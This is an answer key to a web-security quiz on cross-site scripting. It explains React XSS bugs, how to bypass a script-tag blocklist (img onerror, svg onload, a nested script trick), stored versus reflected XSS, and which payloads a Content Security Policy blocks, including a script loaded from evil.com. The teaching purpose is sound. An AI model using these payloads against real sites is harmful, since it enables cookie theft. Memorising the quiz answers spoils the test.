# Lesson 4 Quiz: Answers

## Question 1: Spot the XSS

This component has **two** XSS vulnerabilities.

**Vulnerability 1: `dangerouslySetInnerHTML` with `user.bio`**

This is the obvious one. If the bio field contains `<img src=x onerror="alert('XSS')">`,
React will render it as raw HTML and the script will execute. `dangerouslySetInnerHTML`
completely bypasses React's auto-escaping. The name is a warning — if the `bio` field
comes from user input (and it almost certainly does), this is stored XSS.

**Vulnerability 2: `href={user.websiteUrl}` — URL injection**

This is the sneaky one. React auto-escapes content placed between tags (like
`{user.displayName}`), but it does **not** sanitize URL schemes in `href` attributes.

If a user sets their `websiteUrl` to:
```
javascript:alert('XSS')
```

React renders:
```html
<a href="javascript:alert('XSS')">javascript:alert('XSS')</a>
```

When a visitor clicks that link, the JavaScript executes. This is a click-to-trigger XSS
rather than automatic execution, but it's still a real vulnerability.

**How to fix:**
- For the bio: use a sanitization library like DOMPurify before passing content to
  `dangerouslySetInnerHTML`, or avoid using it entirely and render Markdown safely.
- For the URL: validate that `websiteUrl` starts with `https://` or `http://`. Reject or
  strip any `javascript:`, `data:`, or `vbscript:` schemes.

---

## Question 2: Bypass the Filter

There are several payloads that bypass this filter. Here are a few:

**Approach 1: Use an HTML tag that isn't `<script>`**

```html
<img src=x onerror="alert('XSS')">
```

The filter only removes `<script>` and `</script>` tags. The `<img>` tag with an
`onerror` handler is untouched. Since the result is inserted via `innerHTML`, the browser
parses it as HTML and executes the event handler when the image fails to load.

**Approach 2: Use an event handler on any element**

```html
<div onmouseover="alert('XSS')">hover me</div>
```

Or for auto-executing:

```html
<body onload="alert('XSS')">
<svg onload="alert('XSS')">
<details open ontoggle="alert('XSS')">
```

**Approach 3: Nest `<script>` tags so the filter creates a valid one**

```html
<scr<script>ipt>alert('XSS')</scr</script>ipt>
```

The filter sees and removes `<script>` from inside `<scr[HERE]ipt>`, producing
`<script>alert('XSS')</script>`. (This depends on the filter doing single-pass
replacement, which the `replace()` method does.)

**The lesson:** Blocklist-based filtering (trying to remove known-bad patterns) is almost
always bypassable. There are dozens of ways to execute JavaScript in HTML. The correct
approach is to escape the content so it's never interpreted as HTML, or to use a proven
sanitization library that works from an allowlist of safe tags and attributes.

---

## Question 3: Stored vs. Reflected

**Stored XSS:** The malicious script is saved on the server — in a database, file, or
other persistent storage. Every user who loads the page containing that stored data
executes the script. The attacker sets it up once and it keeps firing.

*Modern example:* A forum where users can post comments. If the comment rendering doesn't
escape HTML, an attacker posts a comment containing a script that steals session cookies.
Every user who reads that thread sends their cookies to the attacker's server.

**Reflected XSS:** The malicious script comes from the current HTTP request — typically a
URL query parameter — and the server includes it in the response without escaping. The
attacker needs to trick someone into clicking a crafted link.

*Modern example:* A search page where the URL `?q=<search term>` is reflected on the page
as "Showing results for: ..." If the term isn't escaped, the attacker can craft a URL like
`?q=<script>...</script>` and send it via email or chat. When the victim clicks, the
script runs in their browser under the application's origin.

**Stored XSS is generally more dangerous** because:
1. **No user interaction needed** — just visiting a normal page triggers it.
2. **Wider blast radius** — it hits every user who views the affected page, not just people
   who click a crafted link.
3. **Harder to detect** — it looks like normal traffic to the server; the URL is clean.
4. **Self-propagating potential** — as the Samy worm demonstrated, stored XSS can copy
   itself, turning a single vulnerability into an exponential outbreak.

Reflected XSS requires social engineering to exploit (you need the victim to click a link),
and it's easier to detect because the payload is visible in the URL/request.

---

## Question 4: How CSP Helps

The CSP is: `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'`

This means:
- Scripts: only from the same origin (`'self'`). **No inline scripts.**
- Styles: from the same origin OR inline (`'unsafe-inline'`).
- Everything else: same origin only.

**1. `<script>alert('XSS')</script>`**

**BLOCKED.** This is an inline script. The `script-src 'self'` directive does not include
`'unsafe-inline'`, so the browser refuses to execute inline `<script>` tags. The browser's
console will show a CSP violation error.

**2. `<img src=x onerror="alert('XSS')">`**

**BLOCKED.** Inline event handlers (`onerror`, `onclick`, `onload`, etc.) are treated as
inline scripts by CSP. Since `script-src` doesn't include `'unsafe-inline'`, the `onerror`
handler will not execute. The image will still fail to load, but the JavaScript won't run.

**3. `<script src="https://evil.com/steal.js"></script>`**

**BLOCKED.** The `script-src 'self'` directive only allows scripts from the same origin.
A script loaded from `https://evil.com` is a different origin and will be blocked.

**4. `<div style="background: url('javascript:alert(1)')">test</div>`**

**Effectively blocked, but for mixed reasons.** The `style-src 'self' 'unsafe-inline'`
directive *does* allow inline styles, so the browser will process the `style` attribute.
However, `javascript:` URLs in CSS are blocked by CSP's script restrictions — executing
JavaScript through a CSS property still requires script permissions. Additionally, modern
browsers have largely dropped support for `javascript:` URLs in CSS contexts (this was
mainly an IE feature). In practice, this payload would not execute in any modern browser
regardless of CSP.

**Key point:** CSP is a defense-in-depth measure, not a replacement for proper escaping.
It catches XSS that slips past your output encoding, but you should never rely on it as
your only protection. Also note that `'unsafe-inline'` in `style-src` (as seen here) does
weaken CSP somewhat — it was historically possible to use CSS for data exfiltration even
without JavaScript execution.
